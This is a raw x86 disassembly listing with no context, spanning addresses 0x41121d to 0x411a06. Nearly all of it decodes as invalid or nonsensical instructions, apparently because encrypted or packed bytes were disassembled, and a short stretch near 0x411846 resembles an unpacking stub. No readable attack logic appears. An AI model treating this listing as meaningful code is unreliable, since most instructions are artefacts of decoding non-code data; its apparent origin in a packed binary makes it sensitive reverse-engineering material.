  41121d:	imul   edi,DWORD PTR ds:0xe3aaa6d5,0x6c17a562
  411227:	ficomp WORD PTR [edi-0x72]
  41122a:	jne    0x41125a
  41122c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41122d:	iret   
  41122e:	mov    eax,edx
  411230:	and    eax,DWORD PTR [ebp-0x2ec99179]
  411236:	add    edx,ecx
  411238:	call   0x76034b31
  41123d:	sub    BYTE PTR [ecx],ch
  41123f:	pop    edi
  411240:	push   ebx
  411241:	(bad)  
  411242:	popa   
  411243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411244:	pop    ebp
  411245:	add    DWORD PTR [edi-0x20],edi
  411248:	pushf  
  411249:	sbb    eax,0xf012b7c
  41124e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41124f:	enter  0x596c,0xd3
  411253:	cmc    
  411254:	int    0xd9
  411256:	daa    
  411257:	add    eax,0xfd16eb80
  41125c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41125d:	lea    ecx,[esi+0x1cc01f94]
  411263:	cmp    ebx,0xc682b9f9
  411269:	push   cs
  41126a:	popa   
  41126b:	data16 jo 0x4112d9
  41126e:	pop    edx
  41126f:	xor    DWORD PTR [esi],ecx
  411271:	mov    ah,BYTE PTR [ebx+0x338305c9]
  411277:	ret    
  411278:	inc    eax
  411279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41127a:	inc    edx
  41127b:	sub    esi,ebx
  41127d:	xor    esp,DWORD PTR [ebx]
  41127f:	(bad)  
  411280:	mov    ah,0xd3
  411282:	arpl   dx,si
  411284:	pop    ss
  411285:	scas   eax,DWORD PTR es:[edi]
  411286:	fnstcw WORD PTR [esi-0x20ada9fe]
  41128c:	in     eax,dx
  41128d:	dec    ecx
  41128e:	call   0x66c2:0x7c4fd6f0
  411295:	shl    DWORD PTR [edi+ebx*2+0x3ad31a7f],1
  41129c:	cmp    bl,BYTE PTR [ecx-0x20]
  41129f:	popa   
  4112a0:	push   ebp
  4112a1:	push   eax
  4112a2:	dec    edi
  4112a3:	or     eax,0xab5806a9
  4112a8:	jl     0x411291
  4112aa:	push   ds
  4112ab:	inc    ecx
  4112ac:	adc    al,0x71
  4112ae:	lea    edi,[edx*1-0x72bac22f]
  4112b5:	loop   0x411323
  4112b7:	inc    edx
  4112b8:	call   0x9d59:0x1e8c43b5
  4112bf:	imul   BYTE PTR [eax+0xb]
  4112c2:	xor    esi,edx
  4112c4:	test   eax,0x666f89c6
  4112c9:	fcom   QWORD PTR [ebx-0x51]
  4112cc:	inc    esi
  4112cd:	(bad)  
  4112ce:	mov    ah,BYTE PTR [eax-0x1f]
  4112d1:	mov    bl,0xd8
  4112d3:	jne    0x411267
  4112d5:	aaa    
  4112d6:	imul   esp,eax,0x8f43427d
  4112dc:	mov    ebp,0x146c6216
  4112e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112e2:	aad    0xcd
  4112e4:	fld    st(2)
  4112e6:	fs pusha 
  4112e8:	mov    esp,0x9a6b0239
  4112ed:	inc    esp
  4112ee:	jl     0x4112c4
  4112f0:	mov    bh,ah
  4112f2:	mov    esp,0xc5f265a8
  4112f7:	popa   
  4112f8:	push   cs
  4112f9:	xchg   ecx,eax
  4112fa:	scas   eax,DWORD PTR es:[edi]
  4112fb:	xor    eax,0x84ae352d
  411300:	mov    edx,0xe4c196cc
  411305:	ja     0x411344
  411307:	mov    ds:0x2ffe9a2f,eax
  41130c:	arpl   WORD PTR [edi-0x4f859dc0],di
  411312:	(bad)  
  411313:	jae    0x411318
  411315:	cmc    
  411316:	pop    eax
  411317:	test   ah,cl
  411319:	sub    BYTE PTR [ebx],ch
  41131b:	adc    ecx,DWORD PTR [edx]
  41131d:	ds (bad) 
  41131f:	jle    0x411350
  411321:	in     al,0x59
  411323:	add    dh,dl
  411325:	sbb    BYTE PTR [ecx],cl
  411327:	in     eax,0x8
  411329:	pop    ss
  41132a:	daa    
  41132b:	xor    DWORD PTR ds:0x857a49,edi
  411331:	jo     0x411302
  411333:	add    DWORD PTR [edx-0xf30fe05],ecx
  411339:	mov    esp,0x27282f62
  41133e:	dec    edx
  41133f:	sub    DWORD PTR [eax+0x3c901ba4],eax
  411345:	and    al,0x3c
  411347:	cmp    DWORD PTR [ecx+0x10df49c],0x4a
  41134e:	dec    edi
  41134f:	dec    ebp
  411350:	fdivr  QWORD PTR [ecx+0x2f]
  411353:	xor    ah,BYTE PTR [ebx+ebp*4-0x4e]
  411357:	add    eax,0x5c17f16f
  41135c:	sbb    ecx,esi
  41135e:	xchg   esp,eax
  41135f:	fstp   TBYTE PTR [ecx-0x572589d9]
  411365:	ins    DWORD PTR es:[edi],dx
  411366:	clc    
  411367:	rcl    esi,cl
  411369:	test   bl,ch
  41136b:	sbb    DWORD PTR [edi+0x30],ecx
  41136e:	(bad)  
  41136f:	ja     0x41139d
  411371:	jmp    0x84c9:0x690c07e7
  411378:	test   al,0x23
  41137a:	addr16 pop es
  41137c:	jle    0x41139c
  41137e:	ret    
  41137f:	inc    esi
  411380:	inc    esi
  411381:	popa   
  411382:	jmp    0xe4b4d1ed
  411387:	mov    esp,0xb4508e65
  41138c:	test   DWORD PTR ds:0x31ffb4b6,ebx
  411392:	inc    ax
  411394:	mov    al,ds:0x3bbb8b7a
  411399:	popf   
  41139a:	aad    0x2d
  41139c:	jg     0x411418
  41139e:	pop    edi
  41139f:	sti    
  4113a0:	cmp    BYTE PTR [eax+0x1d6ad499],ah
  4113a6:	cli    
  4113a7:	arpl   WORD PTR [ebx+0x46a62684],si
  4113ad:	inc    eax
  4113ae:	inc    edi
  4113af:	and    BYTE PTR [esi],bl
  4113b1:	(bad)  
  4113b2:	and    eax,DWORD PTR [ebx]
  4113b4:	adc    al,0xc1
  4113b6:	adc    al,0xbe
  4113b8:	cmp    BYTE PTR [edx-0x7d6753dd],0x98
  4113bf:	or     ebp,DWORD PTR [ebp-0x7974b625]
  4113c5:	fimul  DWORD PTR [esi-0x7c49f014]
  4113cb:	pop    ss
  4113cc:	arpl   WORD PTR [esi-0x5fd3307b],di
  4113d2:	xor    al,0xf7
  4113d4:	mov    DWORD PTR [edi-0x74063cce],ecx
  4113da:	js     0x411404
  4113dc:	les    ebp,FWORD PTR [eax+0x582641f7]
  4113e2:	fnsave [esi+edi*4]
  4113e5:	pop    esp
  4113e6:	mov    dh,BYTE PTR [ebx+0x2011f62c]
  4113ec:	shl    DWORD PTR [edx+0x59c5965a],cl
  4113f2:	jecxz  0x411472
  4113f4:	mov    bh,0x26
  4113f6:	xor    DWORD PTR [ebx],eax
  4113f8:	xor    BYTE PTR [eax],al
  4113fa:	rcl    BYTE PTR [eax],0x9e
  4113fd:	or     eax,0x76ff3f92
  411402:	cmp    eax,0x2c3fce6f
  411407:	dec    esp
  411408:	stos   DWORD PTR es:[edi],eax
  411409:	mov    ebp,0xc85feb3d
  41140e:	mov    DWORD PTR [ebx],edi
  411410:	ret    
  411411:	xchg   edi,eax
  411412:	sub    ebp,DWORD PTR [edi+edi*2]
  411415:	inc    esi
  411416:	xor    edi,ecx
  411418:	and    eax,0xb278883c
  41141d:	stos   BYTE PTR es:[edi],al
  41141e:	ja     0x411465
  411420:	leave  
  411421:	pop    eax
  411422:	pop    ebp
  411423:	jge    0x411450
  411425:	in     eax,dx
  411426:	jp     0x41146e
  411428:	jnp    0x41140c
  41142a:	leave  
  41142b:	adc    eax,0x7c230762
  411430:	aas    
  411431:	icebp  
  411432:	jno    0x411464
  411434:	into   
  411435:	jns    0x4114a2
  411437:	das    
  411438:	out    dx,al
  411439:	outs   dx,BYTE PTR ds:[esi]
  41143a:	jne    0x411400
  41143c:	jo     0x4113e3
  41143e:	jnp    0x4114bd
  411440:	rcr    DWORD PTR [edi-0x2a944c2],cl
  411446:	sub    bl,BYTE PTR [ebp+esi*8-0x2f8f9261]
  41144d:	pop    eax
  41144e:	arpl   cx,cx
  411450:	push   ss
  411451:	mov    edi,0x2a10cb1a
  411456:	out    dx,al
  411457:	lock ins DWORD PTR es:[edi],dx
  411459:	fwait
  41145a:	and    ecx,0x1
  41145d:	lahf   
  41145e:	xchg   esi,eax
  41145f:	dec    edi
  411460:	add    ebx,DWORD PTR [esi+0x72969cde]
  411466:	mov    ch,0xae
  411468:	rcr    BYTE PTR [esi],1
  41146a:	inc    ecx
  41146b:	and    eax,eax
  41146d:	push   ecx
  41146e:	ja     0x41145f
  411470:	pop    ss
  411471:	adc    ebp,DWORD PTR [eax+0x1ddff4e3]
  411477:	repnz inc esi
  411479:	es (bad) 
  41147b:	jg     0x411457
  41147d:	pop    ecx
  41147e:	neg    BYTE PTR ds:[ebp-0x1f0d504a]
  411485:	enter  0xaf70,0x2e
  411489:	dec    edx
  41148a:	sbb    al,0x23
  41148c:	mov    ebx,0x4916ad3a
  411491:	lea    ebx,[ebp+0x39]
  411494:	aad    0x25
  411496:	jmp    0x3d23:0xb9350bb5
  41149d:	xchg   edi,eax
  41149e:	imul   esi,DWORD PTR [eax-0x5b],0x3
  4114a2:	mov    edx,0xd3eac823
  4114a7:	mov    edi,0xeafa0621
  4114ac:	cmp    edi,DWORD PTR [ebx-0x2c32f63e]
  4114b2:	sub    cl,BYTE PTR ds:0x66069a33
  4114b8:	adc    DWORD PTR [edx+0x45b278f6],ebx
  4114be:	or     al,0xc6
  4114c0:	or     ecx,DWORD PTR [eax+0x7d675911]
  4114c6:	dec    ebx
  4114c7:	(bad)  
  4114c8:	sbb    edx,DWORD PTR [edi+0x645240da]
  4114ce:	jmp    0x411451
  4114d0:	sub    eax,0x9157573f
  4114d5:	outs   dx,BYTE PTR ds:[esi]
  4114d6:	push   esi
  4114d7:	les    eax,FWORD PTR [ebx+0x21bc06c4]
  4114dd:	push   ss
  4114de:	pop    esp
  4114df:	xchg   edi,eax
  4114e0:	call   0x4f08:0xfc98ee71
  4114e7:	mov    dl,0xd
  4114e9:	push   ecx
  4114ea:	int3   
  4114eb:	sub    al,0xd1
  4114ed:	xchg   ecx,eax
  4114ee:	icebp  
  4114ef:	mov    ds:0x4ca160a4,eax
  4114f4:	ret    0x7741
  4114f7:	cmp    al,0xb0
  4114f9:	ficomp WORD PTR [esi]
  4114fb:	jmp    0xd1f:0x170be22d
  411502:	lods   al,BYTE PTR ds:[esi]
  411503:	dec    edx
  411504:	fwait
  411505:	bound  eax,QWORD PTR [esi]
  411507:	adc    BYTE PTR ds:[ecx-0x49531371],0xf4
  41150f:	push   eax
  411510:	push   ebx
  411511:	and    dl,BYTE PTR [edi+0x54]
  411514:	out    dx,eax
  411515:	fild   QWORD PTR [ecx-0x17cea410]
  41151b:	rcl    DWORD PTR [esi+0x3],0x7d
  41151f:	in     eax,dx
  411520:	lods   al,BYTE PTR ds:[esi]
  411521:	pop    edi
  411522:	pop    eax
  411523:	push   ecx
  411524:	stos   DWORD PTR es:[edi],eax
  411525:	inc    edi
  411526:	mov    dh,0xe
  411528:	jl     0x411500
  41152a:	retf   0xa33d
  41152d:	cmp    DWORD PTR [eax],esp
  41152f:	shl    cl,1
  411531:	mov    dl,0x6e
  411533:	ins    DWORD PTR es:[edi],dx
  411534:	mov    bh,0x4f
  411536:	mov    esi,0x71ad9aaa
  41153b:	inc    esi
  41153c:	jle    0x41155f
  41153e:	mov    esp,0x10151b2b
  411543:	xchg   esp,eax
  411544:	in     eax,dx
  411545:	repnz imul ecx,ebx,0x511be96a
  41154c:	and    bh,BYTE PTR [edi-0x7b0e1805]
  411552:	cmp    eax,0xffa40346
  411557:	mov    dl,0xfa
  411559:	dec    ebp
  41155a:	cmp    BYTE PTR [ebp+0x48b63a00],ch
  411560:	(bad)  
  411561:	lahf   
  411562:	sbb    ah,BYTE PTR [edi-0x43095434]
  411568:	mov    esi,DWORD PTR [esi+0x58ed9af1]
  41156e:	gs mov dl,0x91
  411571:	std    
  411572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411573:	rcl    al,0x34
  411576:	(bad)  
  411577:	xchg   ebp,eax
  411578:	pop    ds
  411579:	dec    esi
  41157a:	mov    bh,0x80
  41157c:	test   DWORD PTR [esi],0xcb0b55bb
  411582:	mov    ecx,0xb0c79844
  411587:	push   ebp
  411588:	fsub   QWORD PTR [edi-0x110f1a0c]
  41158e:	lahf   
  41158f:	inc    ebp
  411590:	and    BYTE PTR [ecx-0x2e],bh
  411593:	cmp    BYTE PTR [ecx+ebx*1],bh
  411596:	test   al,0x6c
  411598:	popa   
  411599:	loopne 0x411589
  41159b:	pop    ebx
  41159c:	stos   BYTE PTR es:[edi],al
  41159d:	cmp    DWORD PTR [edx],0x19
  4115a0:	ror    BYTE PTR [esi-0x6f2207ac],1
  4115a6:	or     DWORD PTR [edi+0x38c7408c],ebp
  4115ac:	mov    ecx,es
  4115ae:	add    eax,DWORD PTR [eax]
  4115b0:	lock jo 0x41159d
  4115b3:	cdq    
  4115b4:	and    al,BYTE PTR [ebx]
  4115b6:	cwde   
  4115b7:	loopne 0x41159c
  4115b9:	add    eax,DWORD PTR [edx+edx*8-0x1d507e95]
  4115c0:	pop    ds
  4115c1:	dec    eax
  4115c2:	int    0x6c
  4115c4:	inc    esi
  4115c5:	jae    0x4115a3
  4115c7:	(bad)  
  4115c8:	nop
  4115c9:	pop    eax
  4115ca:	and    DWORD PTR [edx-0x5b],eax
  4115cd:	into   
  4115ce:	jmp    0x411645
  4115d0:	jmp    0x41159b
  4115d2:	(bad)  
  4115d3:	jo     0x41155f
  4115d5:	mov    ebp,0x5a1f4de1
  4115da:	imul   esp,ebx,0x531a2017
  4115e0:	inc    esi
  4115e1:	daa    
  4115e2:	lea    ebp,[esp+edx*8+0x5e4f04a0]
  4115e9:	pushf  
  4115ea:	inc    edx
  4115eb:	dec    edi
  4115ec:	pop    ebx
  4115ed:	push   edx
  4115ee:	add    ecx,DWORD PTR [esi+0x3d]
  4115f1:	dec    esi
  4115f2:	iret   
  4115f3:	sbb    sp,ax
  4115f6:	mov    ebp,0x8ec9c2ad
  4115fb:	jecxz  0x411629
  4115fd:	ret    0x34eb
  411600:	jmp    0xf7ef6bcb
  411605:	rcr    BYTE PTR [ecx-0x5],0xf
  411609:	in     eax,0xbf
  41160b:	xor    al,0xf5
  41160d:	mov    al,0xe5
  41160f:	cs cs scas eax,DWORD PTR es:[edi]
  411612:	mov    esp,0x586b8eca
  411617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411618:	outs   dx,BYTE PTR ds:[esi]
  411619:	sub    edi,ecx
  41161b:	adc    al,0x7d
  41161d:	fsub   DWORD PTR [eax+0x32ee569d]
  411623:	sbb    eax,0x86794e25
  411628:	das    
  411629:	mov    eax,ds:0x4af1636a
  41162e:	mov    dl,0x18
  411630:	pop    ds
  411631:	xor    DWORD PTR [ecx-0x7b],edx
  411634:	(bad)  
  411635:	in     eax,0x1
  411637:	push   ebp
  411638:	dec    eax
  411639:	add    bh,BYTE PTR [edi-0x20]
  41163c:	pop    eax
  41163d:	shr    DWORD PTR [eax+0x5fd82693],0x56
  411644:	push   es
  411645:	mov    cl,0x5c
  411647:	cmp    al,0x12
  411649:	(bad)  
  41164a:	lahf   
  41164b:	xor    esi,DWORD PTR [esp+edx*2+0x1f250f8]
  411652:	loope  0x411665
  411654:	jae    0x4115f2
  411656:	fcomp  DWORD PTR ds:0xa7e36d3a
  41165c:	loop   0x4115f0
  41165e:	push   esp
  41165f:	jmp    0x411602
  411661:	lahf   
  411662:	(bad)
  411666:	lahf   
  411667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411668:	inc    ebx
  411669:	call   0xde56dc70
  41166e:	push   ebx
  41166f:	sub    ch,BYTE PTR [ebp-0x54]
  411672:	in     al,dx
  411673:	adc    eax,0x3d4f7c00
  411678:	jl     0x41163e
  41167a:	dec    esi
  41167b:	mov    DWORD PTR [ecx+eax*8-0x17f53733],esp
  411682:	dec    edi
  411683:	outs   dx,DWORD PTR ds:[esi]
  411684:	cld    
  411685:	jp     0x41164b
  411687:	loope  0x4116b8
  411689:	aam    0xcd
  41168b:	js     0x4116f0
  41168d:	sub    eax,0xb622de84
  411692:	jmp    0x6047ab9
  411697:	cmc    
  411698:	aam    0x4d
  41169a:	pop    ds
  41169b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41169d:	push   eax
  41169e:	fwait
  41169f:	aad    0x14
  4116a1:	loope  0x4116fb
  4116a3:	std    
  4116a4:	jl     0x41163f
  4116a6:	mov    edi,?
  4116a8:	lea    edx,[eax+0x5cac52f]
  4116ae:	xor    DWORD PTR [edi-0x69326b9f],0xfffffffc
  4116b5:	mov    bl,dh
  4116b7:	imul   edi,DWORD PTR [ecx+0x258150e],0x71
  4116be:	jecxz  0x411653
  4116c0:	mov    eax,0x6b32f1aa
  4116c5:	in     eax,dx
  4116c6:	fadd   DWORD PTR ds:0xaf80d46
  4116cc:	sbb    DWORD PTR [edi],ebx
  4116ce:	fwait
  4116cf:	push   ebx
  4116d0:	test   DWORD PTR [esi-0x354bd925],esp
  4116d6:	xchg   ecx,eax
  4116d7:	xor    DWORD PTR [eax-0x41],ebp
  4116da:	sub    eax,0x2722d761
  4116df:	or     BYTE PTR [esi+0x4c],dh
  4116e2:	cmp    eax,0xec8c2933
  4116e7:	fldcw  WORD PTR [ecx+0x7630ae14]
  4116ed:	test   eax,0x394f301b
  4116f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f3:	lods   al,BYTE PTR ds:[esi]
  4116f4:	push   edx
  4116f5:	mov    bl,0x7e
  4116f7:	fcomi  st,st(7)
  4116f9:	je     0x41175b
  4116fb:	jp     0x411683
  4116fd:	dec    ecx
  4116fe:	jecxz  0x4116fe
  411700:	mov    ebp,0x76df7a5c
  411705:	rcr    DWORD PTR [ecx],cl
  411707:	xor    DWORD PTR [edi+0x74],ecx
  41170a:	clc    
  41170b:	daa    
  41170c:	pusha  
  41170d:	or     al,0x4f
  41170f:	xor    DWORD PTR [edi+0x53],ebp
  411712:	lods   eax,DWORD PTR ds:[esi]
  411713:	lock aad 0x68
  411716:	add    bl,BYTE PTR [eax-0x31e68f9a]
  41171c:	in     al,dx
  41171d:	sbb    esi,edx
  41171f:	cmp    eax,0xc91c995f
  411724:	xor    al,0x9
  411726:	adc    ah,BYTE PTR [ebx+eiz*2]
  411729:	mov    esp,0x7353f604
  41172e:	clc    
  41172f:	and    BYTE PTR [edi+0x2f48ca61],cl
  411735:	out    dx,al
  411736:	mov    edi,0xd1dbbe03
  41173b:	jbe    0x41178d
  41173d:	or     DWORD PTR [ebx-0x5],esi
  411740:	xor    BYTE PTR [ebp+0x6e674f1a],0x29
  411747:	push   ebx
  411748:	(bad)  
  411749:	mov    dl,0x72
  41174b:	or     eax,0xdc4d1ba1
  411750:	add    DWORD PTR [edx-0x58],edx
  411753:	add    bl,BYTE PTR [esi+0x64]
  411756:	cmp    ecx,DWORD PTR [edi+0x52]
  411759:	in     eax,0xbd
  41175b:	not    DWORD PTR [ecx]
  41175d:	cmc    
  41175e:	pop    esp
  41175f:	jnp    0x4116e8
  411761:	mov    edi,0xf6455c1f
  411766:	fcomp  st(4)
  411768:	cmp    esp,DWORD PTR [eax-0x17]
  41176b:	sbb    bh,BYTE PTR [ecx-0x4]
  41176e:	push   ebx
  41176f:	mov    edi,0x24fc22d2
  411774:	out    dx,eax
  411775:	ror    BYTE PTR [ecx+0x64de9d49],0x27
  41177c:	or     dl,BYTE PTR [eax]
  41177e:	leave  
  41177f:	sub    dh,BYTE PTR [ecx+0x7b6aa01]
  411785:	in     al,0xde
  411787:	aaa    
  411788:	pop    ds
  411789:	leave  
  41178a:	jns    0x4117a4
  41178c:	xlat   BYTE PTR ds:[ebx]
  41178d:	xchg   edi,eax
  41178e:	test   eax,0x8de9de1d
  411793:	jne    0x41176f
  411795:	cmp    bh,BYTE PTR [ebp-0x15]
  411798:	xchg   ecx,eax
  411799:	ja     0x41174e
  41179b:	aad    0x37
  41179d:	inc    esp
  41179e:	jnp    0x411817
  4117a0:	dec    ecx
  4117a1:	cmp    ah,ch
  4117a3:	aas    
  4117a4:	cmp    edi,edi
  4117a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117a7:	add    eax,0x3e9017da
  4117ac:	loopne 0x41173d
  4117ae:	xchg   DWORD PTR [eax],eax
  4117b0:	imul   ecx,DWORD PTR [ebx],0xffffffb7
  4117b3:	scas   al,BYTE PTR es:[edi]
  4117b4:	les    edi,FWORD PTR [ecx+ecx*2-0x70]
  4117b8:	pop    ecx
  4117b9:	fdiv   st(1),st
  4117bb:	fnsave [edx+0x52]
  4117be:	adc    al,0x94
  4117c0:	retf   
  4117c1:	push   ecx
  4117c2:	in     eax,dx
  4117c3:	arpl   bp,bp
  4117c5:	push   eax
  4117c6:	das    
  4117c7:	nop
  4117c8:	or     eax,0x25545b6
  4117cd:	xchg   edi,eax
  4117ce:	jle    0x411766
  4117d0:	popa   
  4117d1:	cmc    
  4117d2:	test   BYTE PTR [ebp-0x5f011303],ch
  4117d8:	scas   eax,DWORD PTR es:[edi]
  4117d9:	jecxz  0x411761
  4117db:	iret   
  4117dc:	in     eax,dx
  4117dd:	das    
  4117de:	mov    BYTE PTR [esi+0x38],bh
  4117e1:	ret    0xea40
  4117e4:	jmp    0x411801
  4117e6:	xchg   edi,eax
  4117e7:	cmp    al,0x76
  4117e9:	popf   
  4117ea:	jle    0x4117ed
  4117ec:	dec    ecx
  4117ed:	rcr    DWORD PTR [ebx-0x4bc2581e],0xa
  4117f4:	jno    0x411779
  4117f6:	fstp   TBYTE PTR [ebp+0x9]
  4117f9:	and    al,0xb
  4117fb:	mov    cl,0x5a
  4117fd:	mov    dl,0xd1
  4117ff:	retf   
  411800:	fstp   QWORD PTR [edx+0x96e0b53]
  411806:	ja     0x411854
  411808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411809:	repz push es
  41180b:	rol    BYTE PTR [edi],1
  41180d:	loopne 0x4117f9
  41180f:	and    BYTE PTR [esi+0x22],ah
  411812:	or     eax,0x58f24eb3
  411817:	adc    DWORD PTR [ebp+0x41288a97],ebx
  41181d:	enter  0x5290,0x20
  411821:	jae    0x411816
  411823:	mov    ebp,0x2de5c86d
  411828:	cmp    DWORD PTR [eax],ebx
  41182a:	out    dx,al
  41182b:	mov    eax,0xb589140a
  411830:	push   cs
  411831:	or     ebp,DWORD PTR [edx+0x40d16c3f]
  411837:	popf   
  411838:	mov    esi,0x347d4f4a
  41183d:	sbb    dl,dl
  41183f:	es push ebx
  411841:	ins    DWORD PTR es:[edi],dx
  411842:	aad    0x6d
  411844:	fisttp DWORD PTR [ebx]
  411846:	pop    eax
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x5b5aba54
  411868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411869:	push   es
  41186a:	hlt    
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x4d]
  411873:	pop    esp
  411874:	fiadd  WORD PTR [ebp+0x4d]
  411877:	pop    edi
  411878:	(bad)  
  411879:	cmp    BYTE PTR [ecx],al
  41187b:	adc    DWORD PTR [ebp+eax*1+0x3e],ebp
  41187f:	xchg   edx,eax
  411880:	sub    eax,0xe65dec42
  411885:	sub    al,0xab
  411887:	outs   dx,DWORD PTR ds:[esi]
  411888:	mov    ch,BYTE PTR [eax]
  41188a:	rcl    DWORD PTR [ebx+0x70],0x6f
  41188e:	retf   0xc9c5
  411891:	xacquire xchg BYTE PTR [ecx],bh
  411894:	(bad)  
  411895:	cwde   
  411896:	imul   ecx,esp,0x5523c7ad
  41189c:	arpl   WORD PTR [ecx],bx
  41189e:	bnd jo 0x411822
  4118a1:	ins    BYTE PTR es:[edi],dx
  4118a2:	aas    
  4118a3:	xor    eax,DWORD PTR ds:[edx+0x6]
  4118a7:	mov    ds:0xbfcbf34,al
  4118ac:	(bad)  
  4118ad:	int    0xa3
  4118af:	or     al,0x36
  4118b1:	xchg   edi,eax
  4118b2:	mov    ?,WORD PTR [esi-0x40fe9160]
  4118b8:	push   esi
  4118b9:	pop    ss
  4118ba:	idiv   BYTE PTR [eax-0x1d]
  4118bd:	iret   
  4118be:	hlt    
  4118bf:	dec    ebp
  4118c0:	in     eax,0xcc
  4118c2:	pop    eax
  4118c3:	lea    edx,ds:0x55c3a38a
  4118c9:	cdq    
  4118ca:	dec    edx
  4118cb:	(bad)  
  4118cc:	mov    ecx,0x51f8c4e
  4118d1:	and    ch,BYTE PTR [eax]
  4118d3:	retf   
  4118d4:	xor    BYTE PTR cs:[eax],al
  4118d7:	adc    eax,ecx
  4118d9:	cmp    bh,BYTE PTR [ebx+0x4e1fe4be]
  4118df:	adc    esi,DWORD PTR [edi+ebx*8-0x7262c284]
  4118e6:	mov    bh,0x3d
  4118e8:	or     BYTE PTR ds:0xee60c56a,ah
  4118ee:	cmp    eax,0xc2f0225
  4118f3:	sbb    al,0x66
  4118f5:	rcl    BYTE PTR [ecx+0x2ac43eaa],0xd0
  4118fc:	add    eax,0x6c07abcd
  411901:	mov    esp,0x71eaf943
  411906:	lods   eax,DWORD PTR ds:[esi]
  411907:	(bad)  
  411908:	ss pop edx
  41190a:	dec    edx
  41190b:	out    0x1b,eax
  41190d:	xchg   BYTE PTR [ebp-0x1dad34e0],dl
  411913:	adc    al,0x37
  411915:	xlat   BYTE PTR ds:[ebx]
  411916:	into   
  411917:	int    0xfd
  411919:	jp     0x4118e9
  41191b:	lahf   
  41191c:	shl    DWORD PTR [edi+0x3c846c4f],0x97
  411923:	adc    ch,ah
  411925:	mov    ecx,0xf10bc378
  41192a:	jl     0x41195c
  41192c:	jmp    0xeec0:0xe13635cd
  411933:	dec    esp
  411934:	cmp    ah,bh
  411936:	inc    ecx
  411937:	add    BYTE PTR [ebx+0x5024d84b],0x69
  41193e:	test   eax,0xac7cd8ca
  411943:	sbb    ecx,edx
  411945:	sbb    esp,eax
  411947:	dec    esp
  411948:	sti    
  411949:	mov    esp,0x38ca1f9c
  41194e:	jae    0x411960
  411950:	loopne 0x411915
  411952:	fwait
  411953:	lahf   
  411954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411955:	cmp    ebx,DWORD PTR [esi+0x26]
  411958:	inc    ebx
  411959:	and    ebp,edi
  41195b:	and    DWORD PTR [edx-0x3e],edx
  41195e:	not    BYTE PTR [edi+0x1e]
  411961:	add    BYTE PTR ds:0x96c6d2d0,cl
  411967:	gs push esi
  411969:	ficom  DWORD PTR [esi]
  41196b:	arpl   cx,sp
  41196d:	pop    ebp
  41196e:	aaa    
  41196f:	inc    DWORD PTR [esi+eiz*8+0x69]
  411973:	mov    edx,0x5f3268ad
  411978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411979:	lock add edx,esi
  41197c:	pop    edx
  41197d:	push   ds
  41197e:	or     esp,eax
  411980:	xor    DWORD PTR [eax+0x45],ecx
  411983:	xor    eax,ebp
  411985:	xchg   dl,ah
  411987:	jmp    0xe7dc7874
  41198c:	cdq    
  41198d:	push   cs
  41198e:	adc    DWORD PTR [edx],ebp
  411990:	sub    ebx,DWORD PTR [esi]
  411992:	imul   ebx,edi,0x9
  411995:	jns    0x4119ba
  411997:	xor    DWORD PTR [eax-0x80],esp
  41199a:	xchg   edi,eax
  41199b:	mov    esi,0x6ea68a8d
  4119a0:	cmp    bl,cl
  4119a2:	jno    0x41196a
  4119a4:	mov    dl,0xee
  4119a6:	push   edx
  4119a7:	(bad)  
  4119a8:	pop    ecx
  4119a9:	call   0xbfc3:0xd4b9e530
  4119b0:	rcl    BYTE PTR [esi],1
  4119b2:	and    al,0x6c
  4119b4:	les    esp,FWORD PTR [eax-0x3c]
  4119b7:	mov    cs,WORD PTR [eax]
  4119b9:	cwde   
  4119ba:	ins    BYTE PTR es:[edi],dx
  4119bb:	push   ds
  4119bc:	imul   ebx,DWORD PTR [edx],0xffffffea
  4119bf:	lea    esi,[esi]
  4119c1:	jnp    0x411a15
  4119c3:	xchg   edx,eax
  4119c4:	pushf  
  4119c5:	push   es
  4119c6:	cwde   
  4119c7:	es daa 
  4119c9:	je     0x411a33
  4119cb:	ror    ah,cl
  4119cd:	dec    eax
  4119ce:	test   al,0xe1
  4119d0:	ret    
  4119d1:	mov    bl,0xf1
  4119d3:	repz push edx
  4119d5:	outs   dx,DWORD PTR ds:[esi]
  4119d6:	leave  
  4119d7:	imul   eax,edx,0x41
  4119da:	aaa    
  4119db:	in     al,0x35
  4119dd:	mov    bp,0x54be
  4119e1:	and    ah,0x5
  4119e4:	imul   ah
  4119e6:	into   
  4119e7:	pop    ecx
  4119e8:	cdq    
  4119e9:	imul   esp,edx,0x38
  4119ec:	bound  ebp,QWORD PTR [ecx]
  4119ee:	sub    DWORD PTR [esi+eiz*2],eax
  4119f1:	test   DWORD PTR ds:0xd2addea3,ebx
  4119f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f8:	xchg   esp,eax
  4119f9:	daa    
  4119fa:	(bad)  [edx]
  4119fc:	retf   0x8cf
  4119ff:	jp     0x411a70
  411a01:	into   
  411a02:	push   esp
  411a03:	inc    esp
  411a04:	push   edx
  411a05:	out    dx,eax
  411a06:	cs rcl dh,0x89
